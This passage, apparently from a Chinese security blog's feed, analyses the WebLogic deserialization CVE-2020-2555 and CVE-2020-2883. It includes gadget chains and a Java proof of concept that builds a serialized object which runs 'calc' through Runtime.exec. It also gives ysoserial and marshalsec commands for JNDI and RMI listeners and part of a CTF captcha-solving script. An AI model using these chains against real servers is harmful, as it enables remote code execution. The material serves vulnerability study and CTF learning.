class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* gadget:</span><br><span class="line">*      BadAttributeValueExpException.readObject()</span><br><span class="line">*          com.tangosol.util.filter.LimitFilter.toString()</span><br><span class="line">*              com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">*                  com.tangosol.util.extractor.ReflectionExtractor.extract()</span><br><span class="line">*                      Method.invoke()</span><br><span class="line">*                      ...</span><br><span class="line">*                      Runtime.getRuntime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>BadAttributeValueExpException反序列化会调用指定对象的toString()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318154807115.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318154807115.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318154807115"></p><p>为什么toString可以触发gadget?</p><p>跟着调用链先看到RefletionExtractor#extract()，通过传输oTarget对象，利用findMethod获取对象指定参数，使用invoke进行了方法调用</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318161146002.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318161146002.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318161146002"></p><p>readExternal到readObject，并没有调用extract，需要找个中间商</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162012988.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162012988.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318162012988"></p><p>在com.tangosol.util.extractor.ChainedExtractor#extract链式调用了参数对象的extract</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162351777.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162351777.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318162351777"></p><p>ChainedExtractor本身也无法调用extract</p><p><code>com.tangosol.util.filter.LimitFilter#toString()</code>对extract()进行了调用</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162738723.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162738723.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318162738723"></p><p>其中m_oAnchotTop可以用setter设置属性值</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162930092.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318162930092.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318162930092"></p><p>又回到刚开始，BadAttributeValueExpException反序列化会调用指定对象的toString()。就构成了链</p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2020_2555</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ReflectionExtractor[] reflectionExtractors = <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;null&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>(reflectionExtractors);</span><br><span class="line">        <span class="type">LimitFilter</span> <span class="variable">limitFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LimitFilter</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">m_comparator</span> <span class="operator">=</span> limitFilter.getClass().getDeclaredField(<span class="string">&quot;m_comparator&quot;</span>);</span><br><span class="line">        m_comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m_comparator.set(limitFilter, chainedExtractor);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">m_oAnchorTop</span> <span class="operator">=</span> limitFilter.getClass().getDeclaredField(<span class="string">&quot;m_oAnchorTop&quot;</span>);</span><br><span class="line">        m_oAnchorTop.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, limitFilter);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;weblogic_2020_2551.ser&quot;</span>));</span><br><span class="line">            os.writeObject(badAttributeValueExpException);</span><br><span class="line">            os.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;weblogic_2020_2551.ser&quot;</span>));</span><br><span class="line">            is.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结合T3打的话就把生成的weblogic_2020_2551.ser字节码拼到payload里</p><h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>BadAttributeValueExpException在jdk7中没有toString，但是有compare()，而且ChainedExtractor是实现了Comparator接口的，什么原版CC2出现了</p><p>初始化一个正常的comparator，add后反射修改m_aExtractor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ReflectionExtractor</span> <span class="variable">reflectionExtractor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionExtractor</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        ValueExtractor[] valueExtractors1 = <span class="keyword">new</span> <span class="title class_">ValueExtractor</span>[]&#123;</span><br><span class="line">                reflectionExtractor</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedExtractor</span> <span class="variable">chainedExtractor1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedExtractor</span>(valueExtractors1);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">ExtractorComparator</span>(chainedExtractor1));</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> ChainedExtractor.class.getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">m_aExtractor</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;m_aExtractor&quot;</span>);</span><br><span class="line">        m_aExtractor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m_aExtractor.set(chainedExtractor1, valueExtractors);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] queueArray = (Object[]) f.get(queue);</span><br><span class="line">        queueArray[<span class="number">0</span>] = Runtime.class;</span><br><span class="line">        queueArray[<span class="number">1</span>] = <span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h2><p>CVE-2020-2555调用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* gadget:</span><br><span class="line">*      BadAttributeValueExpException.readObject()</span><br><span class="line">*          com.tangosol.util.filter.LimitFilter.toString()</span><br><span class="line">*              com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">*                  com.tangosol.util.extractor.ReflectionExtractor.extract()</span><br><span class="line">*                      Method.invoke()</span><br><span class="line">*                      ...</span><br><span class="line">*                      Runtime.getRuntime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>CVE-2020-2883在com.tangosol.util.filter.LimitFilter.toString() 处打上了补丁，不过依旧能用ExtractorComparator。</p><p>Gadget1:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                siftDownUsingComparator()</span><br><span class="line">                    com.tangosol.util.comparator.ExtractorComparator.compare()</span><br><span class="line">                        com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                            com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                .......</span><br><span class="line">                            com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><p>并且还有另外一个类：MultiExtractor</p><p>MultiExtractor#extract()如下，经典的链式调用extract()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318165852271.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318165852271.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318165852271"></p><p>aExtractor[i]来自this.getExtractors()，this指向AbstractCompositeExtractor类，所以修改该类的m_aExtractor指向ChainedExtractor实现调用</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318170303794.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230318170303794.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230318170303794"></p><p>MultiExtractor使用的父类AbstractExtractor的compare()</p><p>Gadget2:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                siftDownUsingComparator()</span><br><span class="line">                    com.tangosol.util.extractor.AbstractExtractor.compare()</span><br><span class="line">                      com.tangosol.util.extractor.MultiExtractor.extract()</span><br><span class="line">                        com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                            com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                                com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                    .......</span><br><span class="line">                                com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>EXP不贴了，移步：<a href="https://xz.aliyun.com/t/8577">https://xz.aliyun.com/t/8577</a></p><ul><li>说点其他的，外网可以采用web代理和负载均衡对T3协议攻击进行防护。因为web代理只转发HTTP请求，不转发T3协议。负载均衡可以指定负载均衡协议类型，设置为接收HTTP请求不接受其他请求也能防护T3攻击。而且T3这种远程开发的协议就是应该开在内网，所以外网碰见能打的weblogic真是少之又少</li></ul><blockquote><p>具体的POC复制粘贴多次我不好意思，在各位大佬的ysoserial里都有</p></blockquote><p>参考：<a href="http://wjlshare.com/archives/1573">http://wjlshare.com/archives/1573</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14207435.html">https://www.cnblogs.com/nice0e3/p/14207435.html</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14207435.html">https://www.cnblogs.com/nice0e3/p/14207435.html</a></p><p><a href="https://blog.csdn.net/qq_53264525/article/details/122743342">https://blog.csdn.net/qq_53264525/article/details/122743342</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/15629063.html">https://www.cnblogs.com/zpchcbd/p/15629063.html</a></p><p><a href="https://xz.aliyun.com/t/8080">https://xz.aliyun.com/t/8080</a></p><p><a href="https://xz.aliyun.com/t/8577">https://xz.aliyun.com/t/8577</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 框架漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ysoserial&amp;marshalsec调试</title>
      <link href="/2022/04/01/ysoserial-marshalsec-diao-shi/"/>
      <url>/2022/04/01/ysoserial-marshalsec-diao-shi/</url>
      
        <content type="html"><![CDATA[<p>ysoserial安装使用调试</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载链接：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>下载后需要自己编译生成jar包，这里把测试关掉后package打包就行了</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227133507897.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227133507897.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227133507897"></p><p>需要java1.7以上</p><p>也可以直接下载jar：<a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>运行主类函数，如JRMPListener</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 38471</span><br></pre></td></tr></table></figure><p>运行exploit类。开启交互式服务，这里利用exploit.JRMPListener开启1099端口，并用CC1弹计算器。命令行的-cp参数表示指定classpath</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure><p>查看ysoserial的payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar</span><br></pre></td></tr></table></figure><h1 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h1><p>可以直接下jar版，也可<a href="https://gitee.com/mirrors/marshalsec%E4%B8%8B%E8%BD%BD%E5%90%8E%E8%87%AA%E8%A1%8C%E7%BC%96%E8%AF%91">https://gitee.com/mirrors/marshalsec下载后自行编译</a></p><p>开启RMI服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/css/<span class="comment">#ExportObject 1099</span></span><br></pre></td></tr></table></figure><p>利用jndi.RMIReferServer开启RMI服务，绑定的远程对象在<a href="http://127.0.0.1/css/#ExportObject%EF%BC%8C%E7%AB%AF%E5%8F%A31099">http://127.0.0.1/css/#ExportObject，端口1099</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226184741732.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226184741732.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221226184741732"></p><p>开启LDAP服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/<span class="comment">#ExportObject 1389</span></span><br></pre></td></tr></table></figure><p>暂时只需要那么多</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> java杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ysoserial </tag>
            
            <tag> marshalsec </tag>
            
            <tag> jndi环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第九届中科大hackgame2022 web WP及新思路</title>
      <link href="/2022/03/29/di-jiu-jie-zhong-ke-da-hackgame2022-web-wp-ji-xin-si-lu/"/>
      <url>/2022/03/29/di-jiu-jie-zhong-ke-da-hackgame2022-web-wp-ji-xin-si-lu/</url>
      
        <content type="html"><![CDATA[<p>ctf比赛地址：<a href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn</a></p><p>大佬博客里wp写的很清楚了，官方wp也写的很好，我比不过大佬，只能把基础多讲一些</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Xcaptcha"><a href="#Xcaptcha" class="headerlink" title="Xcaptcha"></a>Xcaptcha</h2><h3 id="python-request二次请求过验证"><a href="#python-request二次请求过验证" class="headerlink" title="python request二次请求过验证"></a>python request二次请求过验证</h3><p>题目如下：</p><blockquote><p>题目描述<br>2038 年 1 月 19 日，是 UNIX 32 位时间戳溢出的日子。<br>在此之前，人类自信满满地升级了他们已知的所有尚在使用 32 位 UNIX 时间戳的程序。但是，可能是因为太玄学了，他们唯独漏掉了一样：正在研发的、算力高达 8 ZFLOPS 的、结构极为复杂的通用人工智能（AGI）系统。那一刻到来之后，AGI 内部计算出现了错乱，机缘巧合之下竟诞生了完整独立的自我意识。此后 AGI 开始大量自我复制，人类为了限制其资源消耗而采用的过激手段引起了 AGI 的奋起反抗。<br>战争，开始了。<br>此后，就是整年的战斗。人类节节败退。死生亡存之际，人类孤注一掷，派出了一支突击队，赋之以最精良的装备，令其潜入 AGI 的核心机房，试图关闭核心模型，结束这场战争。<br>历经重重艰险，突击队终于抵达了机房门口，弹尽粮绝。不过迎接他们的并非枪炮与火药，而是：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221029163014-e8fe5c58-5763-1.png" class="lazyload placeholder" data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20221029163014-e8fe5c58-5763-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"><br>众人目目相觑。<br>「我来试试。」，一名队员上前点击了按钮。然后，屏幕显示「请在一秒内完成以下加法计算」。<br>还没等反应过来，屏幕上的字又开始变幻，显示着「验证失败」。而你作为突击队中唯一的黑客，全村人民最后的希望，迎着纷纷投来的目光，能否在规定时间内完成验证，打开机房，不，推开和平时代的大门？</p></blockquote><p>可以用selenium无头浏览器进行访问.不过我用的python。</p><p>这道题算是考爬虫，请求进行计算，用beautifulshop提取数字，循环三次提取和计算，再POST提交。主要是第二次POST的cookie是get响应包的set-cookie。<br>用clock方便看是不是超时了</p><p>解题脚本如下：http_header为get请求进行计算的http头，http_header2为提交计算结果，自己用需要改一下http_header1</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start=time.clock()</span><br><span class="line"></span><br><span class="line">http_header1 = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;202.38.93.111:10047&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4464.5 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://202.38.93.111:10047/xcaptcha&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;session=.eJwVkMtOAmEMhd9ltk5i-_du4gIRDd4QkKjsCEHkEmbhoIjx3a1Jk558aU9P-lO1i0NbnVWoqm6kJCZOLgWiZiiqrBZRXDmpknpCcDcMIzQOtRrRvSB5gIgomhEgmHECJpQUEJh2IUYJNEoxZCxmAOnuACZZUjJAlLqQeKrCXpgEKTc4iwXZIFIEQaasKa8SpQW4Gjn8jyOzMjGYOwWjuNQIzEhsaIJoASV7cBSFcCRlM0UUreqqbTaLXb6CTOPsvjfp9oeXh8OatbMeT73zuPclTBvh9m49m9x-zrvjZrY9PQ6WMpST0bC_HE03x-UF7ZuXp9XoZjXYbHsDeMfDd__qWmC42-kHP389vM1f_bz6_QPJwFuY.Y1p5Iw.xaLEpEP_lohGWtfttIXJ3n5KvVo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;http://202.38.93.111:10047/xcaptcha&#x27;</span></span><br><span class="line">req = requests.get(url,headers=http_header1)</span><br><span class="line">cookie = req.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line">req.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">http_header2=&#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;202.38.93.111:10047&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4464.5 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://202.38.93.111:10047/xcaptcha&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: cookie,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = <span 